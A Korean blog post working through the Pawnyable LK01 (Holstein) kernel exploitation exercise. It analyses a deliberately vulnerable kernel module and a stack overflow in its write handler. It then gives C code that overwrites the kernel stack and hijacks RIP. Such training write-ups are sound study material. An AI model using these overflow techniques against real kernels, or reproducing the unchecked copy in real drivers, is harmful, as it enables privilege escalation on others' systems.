---
title: "[Pawnyable] Holstein 모듈 분석 및 취약점 발생"
author: d0razi
date: 2024-02-26 20:13
categories: [InfoSec, Pwn]
tags: [kernel, Pawnyable]
image: /assets/img/media/banner/pawnyable_background.png
---

LK01(Holstein)을 다루는 글에서는 Kernel Exploit의 기초적인 공격 기법에 대해 배웁니다. LK01을 받지 않으신 분들은 먼저 pawnyable 사이트에서 LK01 파일을 받아주세요.

`qemu/rootfs.cpio`이 파일 시스템입니다. 여기서는 `mount` 디렉토리를 만들고 거기에 cpio 파일을 해제해주세요.
# 초기화 처리 확인
우선 `/init`인 파일이 있는데 이것은 커널 부팅 후에 가장 먼저 유저 영역에서 처리되는 파일입니다. CTF에서는 여기에 커널 모듈의 로드 같은 처리가 적혀 있는 경우도 있으므로 반드시 확인합니다.  
이번 `/init`에는 buildroot 표준으로 모듈의 로딩 같은 처리는 `/etc/init.d/S99pawnyable`에 적혀 있습니다.
```bash
#!/bin/sh  
  
##  
## Setup  
##  
mdev -s  
mount -t proc none /proc  
mkdir -p /dev/pts  
mount -vt devpts -o gid=4,mode=620 none /dev/pts  
chmod 666 /dev/ptmx  
stty -opost  
echo 2 > /proc/sys/kernel/kptr_restrict  
#echo 1 > /proc/sys/kernel/dmesg_restrict  
  
##  
## Install driver  
##  
insmod /root/vuln.ko  
mknod -m 666 /dev/holstein c `grep holstein /proc/devices   awk '{print $1;}'` 0  
  
##  
## User shell  
##  
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"  
echo "[ Holstein v1 (LK01) - Pawnyable ]"  
setsid cttyhack setuidgid 1337 sh  
  
##  
## Cleanup  
##  
umount /proc  
poweroff -d 0 -f
```

여기서 중요한 코드가 몇 가지 있습니다. 먼저
```bash
echo 2 > /proc/sys/kernel/kptr_restrict
```

하지만 이것은 이미 배운 대로 KADR을 제어하는 명령어로 KADR이 활성화 되어 있음을 알 수 있습니다. 이 부분은 디버깅에 방해가 되기 때문에 비활성화 해두겠습니다.

아래 코드도 살펴봐야 합니다.
```bash
#echo 1 > /proc/sys/kernel/dmesg_restrict
```
위 코드는 일반 유저에게 dmesg를 허용하겠느냐 입니다. 대부분 CTF는 유효하게 되어있고, 이번에도 허용하겠습니다.

다음에
```bash
insmod /root/vuln.ko
mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0
```
에서 커널 모듈을 로드합니다.  
`insmod` 명령어로 `/root/vuln.ko`라는 모듈을 로딩한 후 `mknod` 로 `/dev/holstein`이라는 디바이스 파일에 `holstein`이라는 이름의 모듈을 결합합니다.

마지막으로
```bash
setsid cttyhack setuidgid 1337 sh
```
유저 id를 1337로 지정한 후 `sh`를 실행합니다. 로그인없이 셸이 부팅되는 것은 이 명령 덕분입니다.

디버깅 시에는 이 유저 id를 0으로 해두면 root 셸을 딸 수 있으므로, 예제를 마치지 않은 분은 변경해주시기 바랍니다.

또, `/etc/init.d`에는 그 외에도 `S01syslogd`와 `S41dhcpcd`등의 초기화 스크립트가 있습니다. 이것들은 네트워크 설정등을 하지만, 이번 디버깅에는 필요 없기 때문에 다른 디렉토리로 이동하거나 호출하는 것을 추천하지 않습니다.
# Holstein 모듈 분석
이 글에서는 Holstein이라는 이름의 취약한 커널 모듈로 Kernel Exploit을 학습합니다. `src/vuln.c`이 커널 모듈 소스 코드기 때문에 이 파일을 먼저 분석해보겠습니다.
## 초기화와 종료
커널 모듈을 작성할 때는 반드시 초기화와 종료 처리를 합니다.  
108번째 줄에
```c
module_init(module_initialize);
module_exit(module_cleanup);
```

위와 같이 작성되어 있습니다. 여기서 각각 초기화, 종료 처리의 함수를 지정하고 있습니다. 먼저 초기화 처리를 담당하는 `module_initialize` 함수를 분석해보겠습니다.
```c
static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
    printk(KERN_WARNING "Failed to register device\n");
    return -EBUSY;
  }

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    printk(KERN_WARNING "Failed to add cdev\n");
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}
```

유저 영역에서 커널 모듈을 조작할 수 있도록 하려면 인터페이스를 작성해야 합니다. 인터페이스는 `/dev`나`/proc`으로 만들어지는 경우가 많으며, 이번에는 `cdev_add`를 사용하고 있으므로 캐릭터 디바이스 `/dev`를 통해 조작하는 타입의 모듈입니다. 그렇다고 이 시점에 `/dev` 디렉토리에 파일이 만들어지는 것은 아닙니다. 조금 전에 `S99pawnyable`에서 본 것처럼, `/dev/holstein` 아래에 `mknod` 명령어로 만들어져 있습니다.

`cdev_init`이라는 함수의 두번째 인자에 `module_fops`라는 변수의 포인터를 전달하고 있습니다. 이 변수는 함수 테이블로, `/dev/holstein`에 대해서 `open`이나 `write`등의 조작이 있을 때 대응하는 함수가 호출되도록 되어 있습니다.
```c
static struct file_operations module_fops =  
  {  
   .owner   = THIS_MODULE,  
   .read    = module_read,  
   .write   = module_write,  
   .open    = module_open,  
   .release = module_close,  
  };
```

이 모듈에서는 `open`, `read`, `write`, `close` 이 4가지에 대한 처리만을 정의하고 있으며, 그 외는 미구현(호출해도 아무 일도 없음)되어 있습니다.

마지막으로 모듈 종료 처리는 단순히 캐릭터 디바이스를 삭제합니다.
```c
static void __exit module_cleanup(void)  
{  
  cdev_del(&c_dev);  
  unregister_chrdev_region(dev_id, 1);  
}
```
## open
`module_open` 함수를 보겠습니다.
```c
static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}
```

`printk`라는 낯선 함수가 있는데, 이 함수는 문자열을 커널의 로그 버퍼에 출력합니다. `KERN_INFO`라고 하는 것은 로그 레벨로, 그 밖에도 `KERN_WARN`등이 있습니다. 출력된 내용은 `dmesg` 명령어로 확인할 수 있습니다.

다음에는 `kmalloc`이라는 함수를 부르고 있습니다.  
이 함수는 커널 공간에서의 `malloc` 함수입니다. 지정한 크기 만큼 영역을 확보할 수 있습니다. 이번에는 `char*` 유형의 전역변수 `g_buf`에 `BUFFER_SIZE`(=0x400) 바이트만큼 메모리를 할당받고 있습니다.

이 `open`모듈은 그러면 0x400 바이트 메모리를 `g_buf`에 할당받는 것을 알 수 있습니다.
## close
`module_close` 를 보겠습니다.
```c
static int module_close(struct inode *inode, struct file *file)  
{  
  printk(KERN_INFO "module_close called\n");  
  kfree(g_buf);  
 return 0;  
}
```

`kfree`함수로 `kmalloc`으로 확보한 힙 메모리를 해제합니다.  
한번 유저에게 `open`된 모듈은 최종적으로 반드시 `close`되므로 처음에 할당받은 `g_buf`를 해제하는 것은 자연스러운 처리입니다.

> 유저 공간의 프로그램이 `close`를 호출하지 않아도 해당 프로그램이 종료될 때 커널이 자동으로 `close`를 호출합니다.
{: .prompt-tip}

이 단계에서 이미 LPE에 연결되는 취약점이 있지만, 그것은 나중에 다루겠습니다.
## read
`module_read`는 유저가 `read`같은 시스템 콜을 호출했을때 호출되는 처리입니다.
```c
static ssize_t module_read(struct file *file,
    char __user *buf, size_t count,
    loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_read called\n");

  memcpy(kbuf, g_buf, BUFFER_SIZE);
  if (_copy_to_user(buf, kbuf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}
```

`g_buf`부터 `BUFFER_SIZE`만큼의 데이터를 `kbuf`라는 스택의 변수에 `memcpy` 함수로 복사합니다.  
그 이후, `_copy_to_user`라는 함수를 호출하고 있습니다. SMAP 파트에서 설명했지만, 이 함수는 사용자 공간에 안전하게 데이터를 복사하는 함수입니다. `copy_to_user`가 아니라 `_copy_to_user`로 되어 있는데, 이는 Stack Overflow를 감지하지 않는 `copy_to_user` 입니다. 보통은 사용하지 않지만, 이번에는 취약점을 위해 사용했습니다.

> `copy_to_user`와 `copy_from_user` 함수는 인사인 함수로 정의되어 있고, 가능한 경우 사이즈 체크를 하도록 되어 있습니다.
{: .prompt-tip}

정리하면, `read` 함수는 `g_buf`에서 한번 스택에 데이터를 복사하고 그 데이터를 요청한 크기만큼 불러오는 함수입니다.
## write
마지막으로 `module_write`를 보겠습니다.
```c
static ssize_t module_write(struct file *file,
    const char __user *buf, size_t count,
    loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_write called\n");

  if (_copy_from_user(kbuf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }
  memcpy(g_buf, kbuf, BUFFER_SIZE);

  return count;
}
```

우선 `_copy_from_user` 함수로 유저 영역에서 데이터를 `kbuf`라는 스택 변수에 복사했습니다. 마지막으로 `memcpy`함수로 `g_buf`에 최대 `BUFFER_SIZE`만큼 `kbuf`에 데이터를 복사합니다.
# Stack Overflow 취약점
```c
static ssize_t module_write(struct file *file,
    const char __user *buf, size_t count,
    loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_write called\n");

  if (_copy_from_user(kbuf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }
  memcpy(g_buf, kbuf, BUFFER_SIZE);

  return count;
}
```

9번째 라인에서 복사하는 크기인 `count`는 유저 공간에서 받아오지만, `kbuf`는 0x400바이트기 때문에 Stack Overflow가 발생합니다. 커널 공간에서도 함수 호출 구조는 사용자 공간과 동일하기 때문에 리턴 주소를 덮거나 ROP chain을 실행할 수 있습니다.
# 취약점 발생
취약점으로 익스플로잇을 하기 전에 이 커널 모듈이 정상적으로 동작하는지 확인해보겠습니다.  
아래와 같이 코드를 쓰고 실행시켜 보았습니다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

int main() {
    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) {
        fatal("open(\"/dev/holstein\")");
    }

    char buf[0x100] = {};
    write(fd, "Hello World!", 13);
    read(fd, buf, 0x100);

    printf("Data: %s\n", buf);

    close(fd);

    return 0;

}
```

`write` 함수로 "Hello World!" 라고 쓴 뒤, 그 데이터를 `read`로 읽기만 하는 프로그램입니다.  
이걸 커널에서 실행해봅시다.

![](https://i.imgur.com/bscAhjM.png)

생각한 대로 작동하는 것을 알 수 있습니다. 또한 커널 로그를 확인해도 별다른 오류가 없습니다.

이젠 Stack Overflow를 발생시켜 보겠습니다. 
```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

int main() {
    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) fatal("open(\"/dev/holstein\")");

    char buf[0x800] = {};
    memset(buf, 'A', 0x800);
    write(fd, buf, 0x800);

    close(fd);
    return 0;
}
```

실행해보면 불길한 메시지가 출력되면서 커널이 종료됩니다.

![](https://i.imgur.com/AdH7g9o.png)

커널 모듈이 비정상적인 처리를 발생시키면 커널이 종료됩니다. 이 때 오류 원인과 오류가 발생했을 때의 레지스터 상태가 출력됩니다. 이 정보는 Kernel Exploit 디버깅에서 매우 중요합니다.

이번 오류 원인은
```
BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..()
kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP NOPTI
```
라고 되어 있습니다. `ptrval`은 포인터입니다만, KADR에 의해 숨겨져 있습니다.  
레지스터 상태에서 봐야하는 것은 RIP이지만, 아쉽게도 0x4141414141414141로 되어 있지 않습니다.

```
RIP: 0010:__memset+0x24/0x30
```

오류 원인에도 출력됐듯이, `copy_from_user`에서 기입할 때 스택의 종단(guard page)에 도달해 버린 것 같습니다. 너무 많이 쓰는 것이 원인이기 때문에 쓰는 양을 줄여보겠습니다.

```c
write(fd, buf, 0x420);
```

그러면 오류 메시지가 바뀝니다.

![](https://i.imgur.com/2TRGgrq.png)

이번에는 general protection fault가 되고 RIP가 잘 출력됩니다.

```
RIP: 0010:0x4141414141414141
```

이처럼 커널 공간에서도 사용자 공간과 마찬가지로 Stack Overflow로 RIP를 컨트롤 할 수 있습니다. 다음 글에서는 이 취약점으로 권한 상승을 하는 방법에 대해 배우겠습니다.